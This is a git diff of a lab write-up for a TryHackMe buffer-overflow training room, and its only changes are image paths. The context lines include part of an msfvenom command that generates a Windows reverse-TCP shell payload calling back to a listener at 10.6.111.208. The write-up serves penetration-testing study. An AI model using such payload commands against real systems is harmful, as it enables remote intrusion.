@@ -39,7 +39,7 @@ description: https://tryhackme.com/room/bufferoverflowprep (oscp.exe)
 
 ### Netcat
 
-<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * We notice that it is running on port 1337
 * So, why not connect to it from Kali on port 1337?
@@ -339,7 +339,7 @@ With the program running in a crashed or running state, run the following Mona c
 
 Your end script should look something like this:
 
-<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 * Save the file&#x20;
 * Go back to Immunity
@@ -399,7 +399,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 * Go back to your exploit and run it
 * You should have a shell
 
-<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
